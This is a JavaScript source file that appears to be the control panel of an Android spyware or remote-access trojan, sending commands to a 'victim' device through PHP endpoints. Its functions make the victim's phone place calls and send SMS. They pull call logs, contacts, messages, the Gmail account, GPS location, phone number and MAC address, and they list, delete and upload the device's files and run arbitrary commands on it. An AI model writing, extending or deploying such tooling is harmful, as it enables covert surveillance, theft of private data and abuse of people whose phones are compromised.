let currentDir="/";
function changeValue(reqValues) {
	let request=new XMLHttpRequest();
	let reqAddress="setVictimVal.php?uid="+target+"&operand="+reqValues;
	request.open("GET", reqAddress, true);
	request.send();
}
function call() {
	let phNo=prompt("Call to: ");
	let reqValues={
		delay: delay,
		command: "call "+phNo,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to call: "+phNo);
}
function sendSMS() {
	let phNo=prompt("Send to: ");
	let body=prompt("Message Body: ");
	let reqValues={
		delay: delay,
		command: "sms "+phNo+" "+body,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Sending SMS...");
}
function callLog() {
	let noc=prompt("No. of logs to fetch: ");
	let reqValues={
		delay: delay,
		command: "log "+noc,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to fetch last "+noc+" call logs");
}
function contacts() {
	let reqValues={
		delay: delay,
		command: "contacts",
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to fetch contacts");
}
function inbox() {
	let noc=prompt("No. of Messages to fetch");
	let reqValues={
		delay: delay,
		command: "inbox "+noc,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to fecth last "+noc+" inbox messages");
}
function sentBox() {
	let noc=prompt("No. of Messages to fetch");
	let reqValues={
		delay: delay,
		command: "sent "+noc,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to fecth last "+noc+" sent box messges");
}
function deleteSMS() {
	let reqValues={
		delay: delay,
		command: "delsms",
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to fecth last delete SMS");
}
function dirs() {
	let command="";
	let reqValues={
		delay: delay,
		command: "dirsN "+currentDir,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to fecth directory listing: "+currentDir);
}
function dirD() {
	let command="";
	let reqValues={
		delay: delay,
		command: "dirsD "+currentDir,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to sort by date: "+currentDir);
}
function getGmail() {
	let reqValues={
		delay: delay,
		command: "gmail",
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Getting gmail account...");
}
function promptVictim() {
	let message=prompt("Enter Prompt Message:");
	let reqValues={
		delay: delay,
		command: "prompt "+message,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Sending Prompt...");
}
function openVictimBrowser() {
	let message=prompt("Enter URL to load:");
	let reqValues={
		delay: delay,
		command: "goToURL "+message,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Loading URL...");
}
function deleteFile(pathTD) {
	let reqValues={
		delay: delay,
		command: "delete "+pathTD,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to delete directory: "+pathTD);
}
function openFile(path) {
	let reqValues={
		delay: delay,
		command: "upload "+path,
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to open: "+path);
}
function inDirs(path) {
	if(path=="..") {
		if(currentDir=="" || currentDir=="/") {
		}
		else {
			currentDir=currentDir.substring(0,currentDir.lastIndexOf('/'));
			currentDir=currentDir.substring(0,currentDir.lastIndexOf('/')+1);
		}
	}
	else
		currentDir+=path+"/";
	dirs();
}
function dumpResponse() {
	console_con.log("Trying to dump Response!");
	let xhttp=new XMLHttpRequest();
	xhttp.onload=function() {
		console_con.log(this.responseText);
	}
	xhttp.open("POST", "setResponse.php", true);
	xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhttp.send("uid="+target);
}

function dumpExplorer() {
	console_con.log("Trying to dump Explorer!");
	let xhttp=new XMLHttpRequest();
	xhttp.onload=function() {
		console_con.log(this.responseText);
		currentDir="/";
		console_con.log("Reloading Explorer!");
	}
	xhttp.open("POST", "setFileE.php", true);
	xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhttp.send("uid="+target);
}
function getLocation() {
	let reqValues={
		delay: delay,
		command: "gps",
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to fetch location...");
}
function getOperator() {
	let reqValues={
		delay: delay,
		command: "operator-name",
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to get Carrier Name...");
}
function getPhoneNo() {
	let reqValues={
		delay: delay,
		command: "phone-no",
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to fetch Phone no...");
}
function getMAC() {
	let reqValues={
		delay: delay,
		command: "mac-addr",
		mode: 1
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Trying to fetch MAC address...");
}
function setDelay() {
	let dVal=parseInt(prompt("Enter the amout of delay in seconds/10 unit"));
	delay=dVal;
	let reqValues={
		delay: delay,
		command: "null",
		mode: 5
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
	console_con.log("Changing delay to: "+dVal);
}
function executeMode2()
{
	param=document.getElementById("mode2Inp").value;
	console_con.log("Executing Mode 2: "+param);
	let reqValues={
		delay: delay,
		command: param,
		mode: 2
	};
	let fReqVals=JSON.stringify(reqValues);
	changeValue(fReqVals);
}
function openInNewWindow() {
	window.open("VictimResponses/"+target+".resp");
}